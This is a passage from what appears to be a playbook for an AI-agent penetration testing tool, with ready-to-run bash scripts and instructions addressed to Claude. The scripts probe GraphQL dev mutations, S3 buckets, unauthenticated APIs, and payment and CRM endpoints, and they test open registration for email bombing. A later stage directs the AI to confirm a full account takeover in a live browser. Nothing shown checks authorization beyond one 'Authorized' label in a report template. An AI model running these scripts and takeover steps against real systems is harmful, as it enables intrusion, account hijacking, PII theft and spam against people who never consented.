  types = data['data']['__schema']['types']
  for t in types:
    if t.get('fields') and t['name'] in ['Query','Mutation','query_root','mutation_root']:
      for f in t['fields']:
        print(f'  {t[\"name\"]}.{f[\"name\"]}')
except Exception as e:
  print(f'Introspection blocked: {e}')
" 2>/dev/null >> results/05_graphql.md
  echo '```' >> results/05_graphql.md

  # Hunt dev/debug mutations
  echo "" >> results/05_graphql.md
  echo "### Dev/Debug Mutation Hunt" >> results/05_graphql.md
  DEV_MUTATIONS=(
    "devGetResetPasswordToken" "devResetPassword" "devCreateUser" "devDeleteUser"
    "debugGetToken" "testLogin" "testReset" "devLogin" "devSignIn"
    "resetPasswordDev" "getPasswordResetToken" "bypassAuth"
    "devResetUnitProgress" "devGetUser" "devSetPassword"
    "createTestUser" "deleteTestData" "resetTestData"
    "adminLogin" "adminGetToken" "adminResetPassword"
    "internalGetToken" "internalResetPassword" "internalLogin"
    "createContact" "deleteUser" "voidPayment" "refundPayment"
  )
  for mutation in "${DEV_MUTATIONS[@]}"; do
    RESP=$(curl -sk -X POST "$LIVE_GQL" \
      -H "Content-Type: application/json" \
      -d "{\"query\":\"mutation { ${mutation} }\"}" --max-time 5)
    if ! echo "$RESP" | grep -qi "Cannot query field\|field.*does not exist\|unknown field\|not found"; then
      echo "**FOUND:** \`$mutation\` → $(echo "$RESP" | head -c 200)" >> results/05_graphql.md
    fi
  done
fi
```

### Group 5D: Cloud Storage + Auth Boundary Sweep

```bash
HOST="<HOST>"
URL="<URL>"
DOMAIN=$(echo "$HOST" | sed 's/www\.//')
COMPANY=$(echo "$DOMAIN" | cut -d. -f1)

echo "## Cloud Storage & Auth Boundaries" > results/05_cloud_auth.md

# S3 bucket enumeration
echo "### S3 Bucket Enumeration" >> results/05_cloud_auth.md
echo "| Status | Bucket |" >> results/05_cloud_auth.md
echo "|--------|--------|" >> results/05_cloud_auth.md

for suffix in "" "-prod" "-production" "-assets" "-static" "-uploads" "-files" "-storage" "-backup" "-data" "-media" "-cdn" "-public" "-dev" "-staging"; do
  bucket="${COMPANY}${suffix}"
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/" --max-time 5)
  [[ "$STATUS" == "200" ]] && echo "| **PUBLIC** | \`$bucket\` |" >> results/05_cloud_auth.md
  [[ "$STATUS" == "403" ]] && echo "| exists (private) | \`$bucket\` |" >> results/05_cloud_auth.md
done

# s3scanner — deep scan all candidates (tests S3, GCS, Azure)
echo "" >> results/05_cloud_auth.md
echo "### s3scanner Deep Scan" >> results/05_cloud_auth.md
echo '```' >> results/05_cloud_auth.md
printf '%s\n' $(for suffix in "" "-prod" "-production" "-assets" "-static" "-uploads" "-files" "-storage" "-backup" "-data" "-media" "-cdn" "-public" "-dev" "-staging"; do echo "${COMPANY}${suffix}"; done) > /tmp/s3_candidates.txt
s3scanner -bucket-file /tmp/s3_candidates.txt 2>/dev/null | grep -v "^$" >> results/05_cloud_auth.md
echo '```' >> results/05_cloud_auth.md

# Also extract bucket names from JS
echo "" >> results/05_cloud_auth.md
echo "### Buckets Referenced in JS" >> results/05_cloud_auth.md
curl -sk "$URL" | grep -oE 's3\.amazonaws\.com/[^/"]+|[a-z0-9-]+\.s3\.[a-z0-9-]+\.amazonaws\.com' 2>/dev/null | sort -u | while read b; do
  echo "- \`$b\`" >> results/05_cloud_auth.md
done

# Auth boundary sweep — test unauthenticated API access on subdomains
echo "" >> results/05_cloud_auth.md
echo "### Unauthenticated API Endpoints" >> results/05_cloud_auth.md
echo "| Status | Size | Endpoint | Sensitive? |" >> results/05_cloud_auth.md
echo "|--------|------|----------|------------|" >> results/05_cloud_auth.md

API_HOSTS=$(cat live_subdomains_clean.txt 2>/dev/null | grep -iE "api|backend|service|func|admin" | head -5)
[ -z "$API_HOSTS" ] && API_HOSTS="$URL"

for api_base in $API_HOSTS; do
  for ep in "/api/v1/users" "/api/users" "/api/v1/auth/register" "/api/v1/profile" "/api/v1/me" "/api/v1/payments" "/users/get_or_create/" "/new_users/get_or_create/" "/docs" "/openapi.json" "/swagger.json"; do
    STATUS=$(curl -sk -o /tmp/ep_resp.json -w "%{http_code}" --max-time 5 "${api_base}${ep}" -A "Mozilla/5.0")
    SIZE=$(wc -c < /tmp/ep_resp.json 2>/dev/null | tr -d ' ')
    if [[ "$STATUS" =~ ^(200|201|202|400|405|422)$ ]]; then
      SENSITIVE=$(cat /tmp/ep_resp.json 2>/dev/null | python3 -c "
import sys,json
try:
  s=str(json.load(sys.stdin)).lower()
  hits=[f for f in ['email','password','token','jwt','ip','phone','card','user_id'] if f in s]
  print(', '.join(hits) if hits else '-')
except: print('-')
" 2>/dev/null)
      echo "| $STATUS | ${SIZE}b | \`${api_base}${ep}\` | $SENSITIVE |" >> results/05_cloud_auth.md
    fi
  done
done
```

### Group 5E: CRM / Payment / Email Injection

```bash
URL="<URL>"
HOST="<HOST>"
COMPANY=$(echo "$HOST" | sed 's/www\.//' | cut -d. -f1)
TEST_EMAIL="security-probe-$(date +%s)@mailinator.com"

echo "## CRM / Payment / Email Injection" > results/05_crm_payment.md

# Payment intent probing
echo "### Payment Endpoints" >> results/05_crm_payment.md
echo "| Status | Size | Endpoint | Payment Data? |" >> results/05_crm_payment.md
echo "|--------|------|----------|---------------|" >> results/05_crm_payment.md

# Extract payment-related keys from page source
curl -sk "$URL" | grep -oiE '"api_pk_[a-f0-9_]{30,}"' 2>/dev/null | head -3 | while read k; do
  echo "**Solidgate merchant key found:** $k" >> results/05_crm_payment.md
done

for ep in "/api/v3/billing/subscription-plans" "/api/billing/payment-intent" "/api/payment" "/api/payments/packages" "/api/v1/payments/create-intent" "/api/checkout" "/api/payments/ecomm/payment_page" "/api/payments/ecomm/payment_object"; do
  STATUS=$(curl -sk -o /tmp/pay_resp.json -w "%{http_code}" --max-time 5 \
    -X POST "${URL}${ep}" -H "Content-Type: application/json" \
    -d "{\"email\":\"${TEST_EMAIL}\"}" -A "Mozilla/5.0")
  SIZE=$(wc -c < /tmp/pay_resp.json 2>/dev/null | tr -d ' ')
  if [[ "$STATUS" =~ ^(200|201|202|400|422)$ ]]; then
    HITS=$(cat /tmp/pay_resp.json 2>/dev/null | python3 -c "
import sys,json
try:
  s=str(json.load(sys.stdin)).lower()
  hits=[f for f in ['paymentintent','merchant','signature','client_secret','payment_id','api_pk','solidgate','ecommpay','stripe'] if f in s]
  print(', '.join(hits) if hits else '-')
except: print('-')
" 2>/dev/null)
    echo "| $STATUS | ${SIZE}b | \`$ep\` | $HITS |" >> results/05_crm_payment.md
  fi
done

# Firebase Cloud Function probing
echo "" >> results/05_crm_payment.md
echo "### Firebase / Cloud Function Probing" >> results/05_crm_payment.md
echo "| Status | Size | URL |" >> results/05_crm_payment.md
echo "|--------|------|-----|" >> results/05_crm_payment.md

for subdomain in "functions" "api" "backend" "worker" "cloud" "us-central1-${COMPANY}"; do
  for fn in "/get-solid-form-merchant-data" "/get-paypal-script-url" "/create-subscription" "/create-payment-intent" "/create-token" "/send-email" "/register" "/onboarding" "/signup"; do
    FB_URL="https://${subdomain}.${HOST}${fn}"
    STATUS=$(curl -sk -o /tmp/fb_resp.json -w "%{http_code}" --max-time 5 \
      -X POST "$FB_URL" -H "Content-Type: application/json" \
      -d "{\"data\":{\"email\":\"${TEST_EMAIL}\"}}" -A "Mozilla/5.0" 2>/dev/null)
    SIZE=$(wc -c < /tmp/fb_resp.json 2>/dev/null | tr -d ' ')
    [[ "$STATUS" =~ ^(200|202|400|401)$ && "$SIZE" -gt 20 ]] && \
      echo "| $STATUS | ${SIZE}b | \`$FB_URL\` |" >> results/05_crm_payment.md
  done
done

# CRM injection
echo "" >> results/05_crm_payment.md
echo "### CRM Injection" >> results/05_crm_payment.md
for ep in "/api/customerio/identify" "/api/customerio/track" "/api/crm/contact" "/api/subscribe" "/api/v1/marketing/subscribe" "/new_users/email_marketing/" "/api/v1/marketing/event"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
    -X POST "${URL}${ep}" -H "Content-Type: application/json" \
    -d "{\"email\":\"${TEST_EMAIL}\",\"name\":\"Security Test\"}" -A "Mozilla/5.0")
  [[ "$STATUS" =~ ^(200|201|204|400)$ ]] && echo "**[$STATUS]** \`$ep\` — potential CRM injection" >> results/05_crm_payment.md
done

# Unauthenticated registration / email spam
echo "" >> results/05_crm_payment.md
echo "### Unauthenticated Registration / Email Bombing" >> results/05_crm_payment.md
for ep in "/api/auth/callback/credentials" "/api/v1/auth/register" "/api/v1/send-welcome" "/api/users/create/" "/onboarding/api/auth/callback/credentials"; do
  STATUS=$(curl -sk -o /tmp/reg_resp.json -w "%{http_code}" --max-time 5 \
    -X POST "${URL}${ep}" -H "Content-Type: application/json" \
    -d "{\"email\":\"${TEST_EMAIL}\",\"password\":\"Test1234!\"}" -A "Mozilla/5.0")
  [[ "$STATUS" =~ ^(200|201|202)$ ]] && echo "**[$STATUS]** Unauthenticated registration at \`$ep\`" >> results/05_crm_payment.md
done
```

---

## STAGE 6 — AI Orchestrator (Claude reads all results and reasons)

> **Instruction to Claude:** **Only start after Stage 5 is fully complete.** Read every file in `results/` and perform the following analysis. This runs in the main context (not a sub-agent) — it needs the full reasoning capability. This is the stage where LLM reasoning adds value beyond what any scanner can do.

### 6.1 Read all results

Read every `results/*.md` file. Build a mental model of:
- What the application does (from OSINT)
- What tech stack it uses (from framework detection, headers, JS analysis)
- What APIs are exposed (from auth boundary sweep)
- What secrets leaked (from trufflehog, JS patterns)
- What historical data is exposed (from archive mining)

### 6.2 Chain findings into exploit paths

Look for multi-step attack chains. Examples:
- Secret in JS → use key to call unauthenticated API → escalate privilege
- Archived UUID → hit unauthenticated GET endpoint → extract PII
- Open registration → no rate limit → mass email bombing
- GraphQL dev mutation → get reset token → full account takeover
- Public S3 bucket with write access → inject malicious content
- CORS + credentials → any origin can make authenticated requests

### 6.3 Playwright exploit confirmation (on-demand)

For any finding rated CVSS >= 8.0 or any multi-step chain, use Playwright MCP to **walk the exploit path in a real browser** and prove it works end-to-end. This turns "possible" into "confirmed."

**When to use Playwright in Stage 6:**

| Finding type | Playwright confirmation |
|---|---|
| SSR data endpoint leaks PII | Navigate authenticated vs unauthenticated — prove the auth bypass visually |
| GraphQL dev mutation exists | Execute through the actual app: trigger `forgotPassword` → call `devGetResetPasswordToken` → call `resetPassword` → verify account is owned |
| Unauthenticated registration | Register via Playwright → check inbox (navigate to mailinator) → verify welcome email arrived |
| Subscription bypass (`is_paid: true`) | Register → inject via API → navigate to premium content → screenshot the paywall bypass |
| CORS + credentials | Open `about:blank`, evaluate `fetch()` with evil origin → prove cross-origin data access |
| CRM injection | Inject test lead → navigate to CRM dashboard (if exposed) → verify the lead appeared |

**How to confirm:**

1. Use `mcp__playwright__browser_navigate` to open the target page
2. Use `mcp__playwright__browser_evaluate` to execute the exploit steps (API calls, form submissions)
3. Use `mcp__playwright__browser_take_screenshot` to capture proof
4. Use `mcp__playwright__browser_network_requests` to capture the actual HTTP responses
5. Use `mcp__playwright__browser_console_messages` to capture any errors or leaked data

**Example — Full ATO confirmation flow:**

```
Step 1: mcp__playwright__browser_navigate → target login page
Step 2: mcp__playwright__browser_evaluate → fetch('/graphql', {body: forgotPassword mutation})
Step 3: mcp__playwright__browser_evaluate → fetch('/graphql', {body: devGetResetPasswordToken query})
Step 4: Extract token from response
Step 5: mcp__playwright__browser_evaluate → fetch('/graphql', {body: resetPassword mutation with stolen token})
Step 6: mcp__playwright__browser_navigate → login page with new password
Step 7: mcp__playwright__browser_fill_form → enter credentials
Step 8: mcp__playwright__browser_take_screenshot → capture authenticated dashboard = ATO confirmed
```

Write confirmed exploit screenshots and network captures to `results/06_playwright_confirmations.md`.

**Rule:** Only confirm high-impact findings (CVSS >= 8.0). Don't waste time confirming missing headers or info-level findings in a browser.

### 6.4 Assess business impact

For each finding, ask:
- **Revenue impact:** Can an attacker steal subscription revenue, generate fake payments, bypass paywalls?
- **Data impact:** Can PII (names, emails, health data, payment info) be accessed at scale?
- **Reputation impact:** Can the company's email system be used for phishing? Can content be defaced?
- **Regulatory impact:** GDPR Art.9 (health data)? PCI-DSS (cardholder data)? CCPA? CAN-SPAM?
- **Operational impact:** Can production databases be flooded with junk data? Can analytics be corrupted?

### 6.5 Generate structured report

Write `results/REPORT.md` in this exact format:

```markdown
# Security Audit Report

**Target:** <URL>
**Date:** YYYY-MM-DD
**Scope:** Authorized black-box penetration test
**Auditor:** hackprobe (AI-assisted)

---

## Executive Summary

<2-3 sentences: what was tested, headline finding count, most critical issue>

---

## Findings

### [F1] <Finding Title>

| Field | Value |
|-------|-------|
| **CVSS** | X.X (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Severity** | Critical / High / Medium / Low |
| **Endpoint** | `<endpoint>` |
| **Confirmed** | Yes — <proof> |
| **Browser Confirmed** | Yes (screenshot in 06_playwright_confirmations.md) / No / N/A |
| **Business Impact** | <revenue / data / reputation / regulatory> |
| **Remediation** | <specific fix> |
| **Priority** | P0 (patch within 24h) / P1 (1 week) / P2 (1 month) |

**Attack Chain:**
1. Step 1
2. Step 2
3. Step 3

---

### [F2] <Next Finding>
...

---

## Cross-Cutting Patterns

| Pattern | Affected | Count |
|---------|----------|-------|
| <pattern name> | <endpoints> | X |

---

## Vulnerability Summary

| ID | CVSS | Severity | Finding | Business Impact |
|----|------|----------|---------|-----------------|
| F1 | 10.0 | Critical | <title> | <impact> |
| F2 | 9.5 | Critical | <title> | <impact> |
...

---

## Remediation Priority

### P0 — Patch Within 24 Hours
1. ...

### P1 — Patch Within 1 Week
1. ...

### P2 — Patch Within 1 Month
1. ...

---

## Tools & Coverage

| Tool | Findings | Coverage Area |
|------|----------|---------------|
| nmap NSE + subzy | X | Default logins, subdomain takeover |
| trufflehog | X | Secret leaks |
| AI reasoning | X | Business logic, chained exploits |
...
```

---

## Anti-Patterns

DO: Spawn groups within a stage as parallel agents, but always wait for all agents to finish before starting the next stage. Stages are sequential; groups within a stage are parallel.
DON'T: Start Stage N+1 before Stage N completes — later stages depend on earlier results files.

DO: Use trufflehog with `--only-verified` — it confirms secrets are live, not just pattern matches.
DON'T: Report regex matches as confirmed secrets without verification.

DO: Mine gau/waybackurls BEFORE active scanning — archived tokens/UUIDs are the fastest path to IDOR.
DON'T: Skip archive mining. Real user tokens from 2020 are often still valid.

DO: Test framework-specific endpoints (Next.js `/_next/data/`, Nuxt `/__nuxt_data/`, etc.) — they bypass UI auth.
DON'T: Assume "it's a frontend app" means no backend data exposure. SSR frameworks ARE backends.

DO: Always test CORS with `Origin: https://evil.com` — reflected origin + credentials = full account compromise from any website.
DON'T: Only test with the same-origin header.

DO: For GraphQL, specifically hunt `dev*`, `debug*`, `test*`, `internal*`, `admin*` mutations. These are dev shortcuts left in production.
DON'T: Stop at introspection schema — execute mutations against a throwaway email to confirm.

DO: Rate every finding by business impact, not just technical severity. A missing security header (CVSS 5.0) matters less than unauthenticated payment intent creation (CVSS 9.1).
DON'T: Report 20 missing headers as "20 findings" — group them as one informational item.

DO: Use mailinator/guerrillamail for all API probing — they receive real emails and confirm email-sending exploits.
DON'T: Use real victim emails when testing registration or email marketing injection.

DO: For payment endpoints, confirm the response returns a live PaymentIntent/Signature — that proves real financial impact.
DON'T: Submit actual payment data or card numbers during testing.
